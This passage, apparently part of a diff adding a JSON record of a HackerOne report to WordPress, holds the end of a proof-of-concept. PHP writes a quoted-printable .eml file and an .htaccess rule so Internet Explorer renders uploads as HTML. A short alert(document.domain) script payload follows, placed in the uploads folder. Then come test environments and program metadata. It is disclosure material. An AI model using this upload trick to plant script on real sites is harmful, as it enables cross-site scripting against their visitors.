str_replace(&#39;%&#39;,&#39;=&#39;,$url);\n$eml_content = \n&quot;TESTME\nContent-Type: text/html\nContent-Transfer-Encoding: quoted-printable\n\n=3Chtml=3E=3Ch1=3EWordPress=3C=2Fhtml=3E\n=3Ciframe=20src=3D=27$url=27=3E=3C=2Fiframe=3E=0A\n\n&quot;;\n$htaccess_content = &quot;AddType message/rfc822 .eml\nHeader add Content-Transfer-Encoding \\&quot;quoted-printable\\&quot;&quot;;\n$eml_file = file_put_contents(&quot;test.eml&quot;, $eml_content, FILE_APPEND | LOCK_EX );\n$htaccess_file = file_put_contents(&quot;.htaccess&quot;, $htaccess_content, FILE_APPEND | LOCK_EX );\n//echo $eml_content;\n?&gt;\n</code></pre>\n<p>6- After you create <code>test.eml</code> and <code>.htaccess</code> go to test.eml in <strong>any</strong> Windows and any IE version and you will see an alert of WordPress host! </p>\n\n<h2 id=\"live-poc\">Live PoC </h2>\n\n<p>Just create a file at this path <code>http://127.0.0.1/wordpress/wp-content/uploads/2017/10/test.txt</code> with the following code :<br>\n<code>&lt;html&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/html&gt;</code><br>\nAnd access this page using IE <br>\n<a title=\"http://playground.ahussam.me/test.eml\" href=\"/redirect?signature=d6947d785b7eb28c0ee5d658643ebc5d40924e18&amp;url=http%3A%2F%2Fplayground.ahussam.me%2Ftest.eml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://playground.ahussam.me/test.eml</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"screenshots\">Screenshots </h2>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"wp1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/227/941/9060fd14e07b4caf3509fec52ead104ace7bed05/wp1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222724Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3e64342adcb6ee9cf49c61e25e789de4ce93999d73ffcc05bc7f817b83a30de4\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/227/941/9060fd14e07b4caf3509fec52ead104ace7bed05/wp1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222724Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3e64342adcb6ee9cf49c61e25e789de4ce93999d73ffcc05bc7f817b83a30de4\" class=\"markdown-inline-image\"></a></p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"wp2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/227/943/6e92617ee30361a4f3f33a012ffc06f1510cf830/wp2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222724Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=141fd1ca7ffcad3642ae2355eaae896414825e540c5cf7a19545ba1c74dbae91\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/227/943/6e92617ee30361a4f3f33a012ffc06f1510cf830/wp2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222724Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=141fd1ca7ffcad3642ae2355eaae896414825e540c5cf7a19545ba1c74dbae91\" class=\"markdown-inline-image\"></a></p>\n\n<h2 id=\"test-environment\">Test Environment </h2>\n\n<p>Windows 10, IE 11; Windows 8.1, IE 11; Windows 8 IE 10. </p>\n\n<p>If you have any question I will be happy to answer it. </p>\n\n<p>I am waiting your reply. </p>\n\n<p>Thanks for reading </p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://wordpress.org/", 
+            "about": "Beautiful sites of any kind.", 
+            "twitter_handle": "wordpress", 
+            "name": "WordPress"
+        }, 
+        "handle": "wordpress", 
+        "url": "https://hackerone.com/wordpress", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/055/2ded484d947025dc191342c9ccdcf00effc53ff6_small.jpg?1392934661", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 55, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
